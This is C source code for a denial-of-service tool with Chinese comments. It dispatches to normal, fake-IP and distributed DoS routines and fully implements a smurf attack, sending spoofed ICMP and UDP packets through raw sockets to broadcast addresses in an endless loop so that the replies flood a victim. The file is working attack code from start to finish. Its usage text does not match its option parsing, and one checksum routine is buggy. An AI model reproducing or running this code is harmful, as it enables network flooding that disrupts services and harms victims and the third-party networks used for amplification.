#include <stdio.h>  
#include <netdb.h>  
#include <sys/types.h>  
#include <sys/socket.h>  
#include <netinet/in.h>  
#include <netinet/in_systm.h>  
#include <arpa/inet.h>  
#include <sys/stat.h>  
#include <fcntl.h>  
#include <unistd.h>  
#include <stdlib.h>  
#include <string.h>  
#include <ctype.h>  
#include <time.h>
#include "normal_dos.h"
#include "fakeip_dos.h"
#include "ddos.h"
 
#ifdef LINUX   
#define __FAVOR_BSD             /* should be __FAVOUR_BSD ;) */  
#ifndef _USE_BSD  
#define _USE_BSD  
#endif  
#endif  
#include <netinet/ip.h>  
#include <netinet/ip_icmp.h>  
#include <netinet/udp.h>  
  
#ifdef LINUX  
#define FIX(n)  htons(n)  
#else  
#define FIX(n)  (n)  
#endif  
#define PAYLOAD_SIZE 512

//定义结构体smurf
struct smurf_t  
{  
    struct sockaddr_in sin;         /* socket prot structure */  
    int s;                 		/* socket */  
    int udp, icmp;              	/* icmp, udp booleans */  
    int rnd;                    	/* Random dst port boolean */  
    int psize;                  	/* packet size */  
    int num;                    	/* number of packets to send */  
    int delay;                  	/* delay between (in ms) */  
    u_short dstport[25+1];         /* dest port array (udp) */  
    u_short srcport;                	/* source port (udp) */  
    char *padding;              	/* junk data */  
};  
  
//函数声明
void usage();  
u_long resolve (char *);  
void getports (struct smurf_t *, char *);  
void smurficmp (struct smurf_t *, u_long);  
void smurfudp (struct smurf_t *, u_long, int);  
u_short in_chksum (u_short *, int);  
u_short checksum_4(u_short *buf, int len) {

    u_long cksum = 0;

    while(len > 1) {
        cksum += *buf++;
        len -= sizeof(u_short);
    }

    if (len)
        cksum += *(u_char *)buf;

    while (cksum >> 16)
        cksum = (cksum >> 16) + (cksum & 0xffff);
    return (u_short)(~cksum);
}


int main(int argc, char *argv[])  
{
    if(argc==1)
	//输出用法
	usage();
    if(argc==2)
    {
	normal_dos(argv[1]);
	}
    if(argc==3)
    {
	fakeip_dos(argv[1], argv[2]);
	}
    if(argc==4)
    {
	ddos(argv[1], argv[2], argv[3]);
	}
	struct smurf_t sm;  
        struct stat st;  
        u_long bcast[1024];  
        char buf[32];  
        int c, fd, n, cycle, num = 0, on = 1;   
        FILE *bcastfile;  
  
    
    	fprintf(stderr, "\nsmurf Attack\n\n");  
      
  
    	//默认设定 	
	memset((struct smurf_t *) &sm, 0, sizeof(sm));  
    	sm.icmp = 1;  
    	sm.psize = 64;  
    	sm.num = 0;  
    	sm.delay = 10000;  
    	sm.sin.sin_port = htons(0);  
    	sm.sin.sin_family = AF_INET;  
    	sm.srcport = 0;  
    	sm.dstport[0] = 7;  
  
    	//伪造的源ip地址
   	sm.sin.sin_addr.s_addr = resolve(argv[1]);  
  
    	//打开广播文件
    	if ((bcastfile = fopen(argv[2], "r")) == NULL)  
    	{  
    	    perror("Opening broadcast file");  
    	    exit(-1);  
    	}  
  
    	//选项 
    	optind = 3;  
    	while ((c = getopt(argc, argv, "rRn:d:p:P:s:S:f:")) != -1)  
    	{  
    	switch (c)  
    	{  
    	    //随机目的端口  
    	    case 'r':  
    	    sm.rnd = 1;  
    	    break;  
  	
    	    //随机目的、源端口  
    	    case 'R':  
    	    sm.rnd = 1;  
    	    sm.srcport = 0;  
    	    break;  
  
    	    //数据包数目  
    	    case 'n':  
    	    sm.num = atoi(optarg);  
    	    break;  
  
    	    //包间隔 
    	    case 'd':  
    	    sm.delay = atoi(optarg);  
    	    break;  
  
    	    /* multiple ports */  
    	    case 'p':  
    	    if (strchr(optarg, ','))   
    	        getports(&sm, optarg);  
    	    else  
    	        sm.dstport[0] = (u_short) atoi(optarg);  
    	    break;  
  
    	    //特定协议
    	    case 'P':  
    	    if (strcmp(optarg, "icmp") == 0)  
    	    {  
    	        /* this is redundant */  
    	        sm.icmp = 1;  
    	        break;  
    	    }  
    	    if (strcmp(optarg, "udp") == 0)  
    	    {  
    	        sm.icmp = 0;  
    	        sm.udp = 1;  
    	        break;  
    	    }  
    	    if (strcmp(optarg, "both") == 0)  
    	    {  
    	        sm.icmp = 1;  
    	        sm.udp = 1;  
    	        break;  
    	    }  
  
    	    puts("Error: Protocol must be icmp, udp or both");  
    	    exit(-1);  
  	
    	    //源端口
    	    case 's':  
    	    sm.srcport = (u_short) atoi(optarg);  
    	    break;  
  	
    	    //包大小  
    	    case 'S':  
    	    sm.psize = atoi(optarg);  
    	    break;  
  
    	    /* filename to read padding in from */  
            case 'f':  
            /* open and stat */  
            if ((fd = open(optarg, O_RDONLY)) == -1)  
            {  
            perror("Opening packet data file");  
            exit(-1);  
            }  
            if (fstat(fd, &st) == -1)  
            {  
            perror("fstat()");  
            exit(-1);  
            }  
  
            /* malloc and read */  
            sm.padding = (char *) malloc(st.st_size);  
            if (read(fd, sm.padding, st.st_size) < st.st_size)  
            {  
            perror("read()");  
            exit(-1);  
            }  
  
            sm.psize = st.st_size;  
            close(fd);  
            break;  
  
            default:  
                usage();  
            }  
        } /* end getopt() loop */
   	/* create packet padding if neccessary */  
    	if (!sm.padding)  
    	{  
    	sm.padding = (char *) malloc(sm.psize);  
    	memset(sm.padding, 0, sm.psize);  
    	}  
  
    	/* create the raw socket */  
    	if ((sm.s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1)  
    	{  
    	perror("Creating raw socket (are you root?)");  
    	exit(-1);  
    	}  
  
    	/* Include IP headers ourself (thanks anyway though) */  
    	if (setsockopt(sm.s, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof(on)) == -1)  
    	{  
    	perror("setsockopt()");  
    	exit(-1);  
    	}  
  
    	//读取文件到数组
    	while (fgets(buf, sizeof buf, bcastfile) != NULL)  
    	{  
    	char *p;  
    	int valid;  
  
        	/* skip over comments/blank lines */  
        	if (buf[0] == '#' || buf[0] == '\n') continue;  
  	
        	/* get rid of newline */   
        	buf[strlen(buf) - 1] = '\0';  
  
        	/* check for valid address */  
        	for (p = buf, valid = 1; *p != '\0'; p++)  
        	{  
        	    if ( ! isdigit(*p) && *p != '.' )   
        	    {  
        	        fprintf(stderr, "Skipping invalid ip %s\n", buf);  
        	        valid = 0;  
        	        break;  
        	    }  
        	}  
  	
        	/* if valid address, copy to our array */  
        	if (valid)  
        	{  
        	bcast[num] = inet_addr(buf);  
        	    num++;  
        	if (num == 1024)  
        	break;  
        	}  
    	} /* end bcast while loop */  
  


    	/* seed our random function */  
    	srand(time(NULL) * getpid());  
  	
 	   /* wee.. */  
 	   for (n = 0, cycle = 0; n < sm.num || !sm.num; n++)  
 	   {  
 	   if (sm.icmp)
 	       smurficmp(&sm, bcast[cycle]);  
 	 
 	   if (sm.udp)  
 	   {  
 	       int x;  
 	       for (x = 0; sm.dstport[x] != 0; x++)  
 	           smurfudp(&sm, bcast[cycle], x);  
 	   }  
 	 
 	   /* quick nap */  
 	   usleep(sm.delay);  
  
 	   /* cosmetic psychadelic dots */  
 	   if (n % 50 == 0)  
 	   {  
 	       printf(".");  
 	       fflush(stdout);  
 	   }  
 	 
 	   cycle = (cycle + 1) % num;  
 	   }
    exit(0);
}

//相关函数
//用法输出
void usage()  
{  
    printf("usage:\n"	
"Dos Attack: Type 1, normal dos.----<target ip>\n"
"Dos Attack: Type 2, fakeip dos.----<target ip> <fake ip>\n"
"Dos Attack: Type 3, ddos.----<target ip> <start ip> <end ip>\n"
"Dos Attack: Type 4, smurf.----<source host> <broadcast file> [options]\n"  
        "\n"  
        "Options\n"  
        "--icmp:    	Protocols to use icmp\n"  
        "--udp:      	Protocols to use udp\n" 
        "--data:     	Data size    \n"  
        "--destport:  	Use  dest ports    (default 0)\n"  
        "--ttl:    	Change ttl     (default 64)\n"  
        "--count:	Num of packets     (default ∞)\n"  
        "\n");  
    exit(-1);  
}  
  

u_long  resolve (char *host)  
{  
    struct in_addr in;  
    struct hostent *he;  
  
    /* try ip first */  
    if ((in.s_addr = inet_addr(host)) == -1)  
    {  
    /* nope, try it as a fqdn */  
    if ((he = gethostbyname(host)) == NULL)  
    {  
        /* can't resolve, bye. */  
            herror("Resolving victim host");  
        exit(-1);  
    }  
  
    memcpy( (caddr_t) &in, he->h_addr, he->h_length);  
    }  
  
    return(in.s_addr);  
}  
      
//端口获得
void  getports (struct smurf_t *sm, char *p)  
{  
    char tmpbuf[16];  
    int n, i;  
  
    for (n = 0, i = 0; (n < 25) && (*p != '\0'); p++, i++)  
    {  
    if (*p == ',')  
    {  
            tmpbuf[i] = '\0';  
        sm->dstport[n] = (u_short) atoi(tmpbuf);  
        n++; i = -1;  
        continue;  
    }  
  
    tmpbuf[i] = *p;  
    }  
    tmpbuf[i] = '\0';  
    sm->dstport[n] = (u_short) atoi(tmpbuf);  
    sm->dstport[n + 1] = 0;  
}  
  
//icmp Smurf攻击
void smurficmp (struct smurf_t *sm, u_long dst)  
{  
    struct ip *ip;  
    struct icmp *icmp;  
    char *packet;  
  
    int pktsize = sizeof(struct ip) + sizeof(struct icmp) + sm->psize;  
  
    packet = malloc(pktsize);  
    ip = (struct ip *) packet;  
    icmp = (struct icmp *) (packet + sizeof(struct ip));  
  
    memset(packet, 0, pktsize);  
  
    /* fill in IP header */  
    ip->ip_v = 4;  
    ip->ip_hl = 5;  
    ip->ip_tos = 0;  
    ip->ip_len = FIX(pktsize);  
    ip->ip_ttl = 255;  
    ip->ip_off = 0;  
    ip->ip_id = FIX( getpid() );  
    ip->ip_p = IPPROTO_ICMP; 
    ip->ip_sum = 0;  
    ip->ip_src.s_addr = sm->sin.sin_addr.s_addr;  
    ip->ip_dst.s_addr = dst;
    ip->ip_sum = checksum_4((u_short *)ip, sizeof(struct ip));
    /* fill in ICMP header */  
    icmp->icmp_type = ICMP_ECHO;  
    icmp->icmp_code = 0;
    icmp->icmp_cksum = 0;
    memset(packet + sizeof(struct ip) + sizeof(struct icmp), rand() % 255, sm->psize);
    icmp->icmp_cksum = checksum_4((u_short *)icmp, sizeof(struct icmp) + sm->psize);
    //icmp->icmp_cksum = htons(~(ICMP_ECHO << 8));   /* thx griffin */  
  
    /* send it on its way */  
    if (sendto(sm->s, packet, pktsize, 0, (struct sockaddr *) &sm->sin,  
        sizeof(struct sockaddr)) == -1)  
    {  
    perror("sendto()");  
    exit(-1);  
    }  
  
    free(packet);                   /* free willy! */  
}  
  
//udp Smurf攻击
void  smurfudp (struct smurf_t *sm, u_long dst, int n)  
{  
    struct ip *ip;  
    struct udphdr *udp;  
    char *packet, *data;  
  
    int pktsize = sizeof(struct ip) + sizeof(struct udphdr) + sm->psize;  
  
    packet = (char *) malloc(pktsize);  
    ip = (struct ip *) packet;  
    udp = (struct udphdr *) (packet + sizeof(struct ip));  
    data = (char *) (packet + sizeof(struct ip) + sizeof(struct udphdr));  
  
    memset(packet, 0, pktsize);  
    if (*sm->padding)  
        memcpy((char *)data, sm->padding, sm->psize);  
  
    /* fill in IP header */  
    ip->ip_v = 4;  
    ip->ip_hl = 5;  
    ip->ip_tos = 0;  
    ip->ip_len = FIX(pktsize);  
    ip->ip_ttl = 255;  
    ip->ip_off = 0;  
    ip->ip_id = FIX( getpid() );  
    ip->ip_p = IPPROTO_UDP;  
    ip->ip_sum = 0;  
    ip->ip_src.s_addr = sm->sin.sin_addr.s_addr;  
    ip->ip_dst.s_addr = dst;  
  
    /* fill in UDP header */  
    if (sm->srcport) udp->uh_sport = htons(sm->srcport);  
    else udp->uh_sport = htons(rand());  
    if (sm->rnd) udp->uh_dport = htons(rand());  
    else udp->uh_dport = htons(sm->dstport[n]);  
    udp->uh_ulen = htons(sizeof(struct udphdr) + sm->psize);  
//  udp->uh_sum = in_chksum((u_short *)udp, sizeof(udp));  
  
    /* send it on its way */  
    if (sendto(sm->s, packet, pktsize, 0, (struct sockaddr *) &sm->sin,  
        sizeof(struct sockaddr)) == -1)  
    {  
    perror("sendto()");  
    exit(-1);  
    }  
  
    free(packet);               /* free willy! */  
}  
  

//校验和
u_short in_chksum (u_short *addr, int len)  
{  
    register int nleft = len;  
    register u_short *w = addr;  
    register int sum = 0;  
    u_short answer = 0;  
  
    while (nleft > 1)   
    {  
        sum += *w++;  
        nleft -= 2;  
    }  
  
    if (nleft == 1)   
    {  
        *(u_char *)(&answer) = *(u_char *)w;  
        sum += answer;  
    }  
  
    sum = (sum >> 16) + (sum + 0xffff);  
    sum += (sum >> 16);  
    answer = ~sum;  
    return(answer);  
}